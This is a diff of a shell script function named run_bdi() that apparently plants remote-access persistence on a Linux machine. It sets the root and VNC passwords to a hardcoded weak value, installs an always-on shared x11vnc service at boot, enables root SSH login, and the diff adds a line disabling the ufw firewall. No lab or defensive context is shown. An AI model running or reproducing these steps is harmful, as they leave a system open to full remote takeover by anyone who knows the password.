@@ -8,6 +8,8 @@ run_bdi() {
   x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
   yes bruh22 | passwd
 
+  ufw disable
+
   echo -e "[Unit]\nDescription=Start x11vnc at startup.\nAfter=multi-user.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/x11vnc -auth guess -forever -noxdamage -repeat -rfbauth /etc/x11vnc/vncpwd -rfbport 5900 -shared\n\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/x11vnc.service
   echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 
